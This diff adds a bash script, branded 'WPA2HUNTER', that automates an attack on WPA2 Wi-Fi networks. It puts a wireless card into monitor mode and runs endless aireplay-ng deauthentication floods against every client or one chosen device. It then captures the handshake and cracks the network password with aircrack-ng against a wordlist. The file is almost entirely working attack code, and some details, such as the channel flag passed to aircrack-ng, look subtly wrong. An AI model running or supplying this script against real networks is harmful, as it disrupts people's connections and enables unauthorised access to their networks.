@@ -1,0 +1,90 @@
+#!/bin/bash
+
+echo -e "
+\033[1;32m         _       ______  ___   ___   __  ____  ___   __________________ \033[0m
+\033[1;32m        | |     / / __ \/   | |__ \ / / / / / / / | / /_  __/ ____/ __ \033[0m
+\033[1;32m        | | /| / / /_/ / /| | __/ // /_/ / / / /  |/ / / / / __/ / /_/ /\033[0m
+\033[1;32m        | |/ |/ / ____/ ___ |/ __// __  / /_/ / /|  / / / / /___/ _, _/ \033[0m
+\033[1;32m        |__/|__/_/   /_/  |_/____/_/ /_/\____/_/ |_/ /_/ /_____/_/ |_|  \033[0m
+\033[1;34m                                                                          
+\033[1;34m                   								𝙱𝚢 𝚜𝚊𝚌𝚑𝚎𝚎𝚡\033[0m
+\033[1;36m________________________________________________________________________________\033[0m
+"
+
+
+# Kill processes
+sudo airmon-ng check kill
+
+WIFIMONFACE=$(airmon-ng | grep -Po "w.*?(?=r)")
+        ip link set $WIFIMONFACE down
+        iw $WIFIMONFACE set monitor none
+        ip link set $WIFIMONFACE up
+        ./hcxdumptool -o foo.bar -i $WIFIMONFACE --enable_status=15 &>/dev/null &
+
+# Capturing BSSID
+airodump-ng $WIFIMONFACE
+
+echo -n -e "\033[1;33m\nEnter BSSID: \033[0m"
+read bssid
+
+echo -n -e "\033[1;33mEnter Channel number: \033[0m"
+read c
+
+# Input validation for channel number
+re='^[0-9]+$'
+if ! [[ $c =~ $re ]]; then
+    echo -e "\033[1;31mError: Channel must be a number.\033[0m"
+    exit 1
+fi
+
+echo -n -e "\033[1;33mEnter file name to save captured files: \033[0m"
+read filename
+
+airodump-ng $WIFIMONFACE -c $c
+
+echo -e "\033[1;36mOptions:
+                1. Deauth all devices Connected to the network
+                2. Deauth specified device\033[0m"
+echo -n -e "\033[1;33mYour choice: \033[0m"
+read choice
+
+if [ "$choice" = 2 ]; then
+    echo -n -e "\033[1;33mEnter BSSID of the device: \033[0m"
+    read devBssid
+fi
+
+echo -e "\033[1;33mEnter \"q\" two times to quit after capturing Handshake\033[0m"
+sleep 1
+
+# Deauthentication Attack
+if [ "$choice" = 1 ]; then
+    xterm -title "Deauthenticating all clients on $bssid" -e aireplay-ng --deauth 0 -a $bssid --ignore-negative-one $WIFIMONFACE &
+    
+elif [ "$choice" = 2 ]; then
+    xterm -title "Deauthenticating client $devBssid" -e aireplay-ng --deauth 0 -a $bssid -c $devBssid $WIFIMONFACE
+
+fi
+
+
+# Capturing Handshake
+sudo airodump-ng -w "$filename" -c "$c" --bssid "$bssid" $WIFIMONFACE
+
+echo -n -e "\033[1;33mDo you need to crack the password? (y/n): \033[0m"
+read flag
+
+if [ "$flag" = 'y' ]; then
+    echo -n -e "\033[1;33mPath to your word list: \033[0m"
+    read wrdlist
+
+    if [ -f "$wrdlist" ]; then
+        aircrack-ng "$filename-01.cap" -c "$c" -w "$wrdlist"
+    
+    else
+        echo "File does not exist."
+        exit
+    fi
+
+else
+    echo "Bye!"
+
+fi
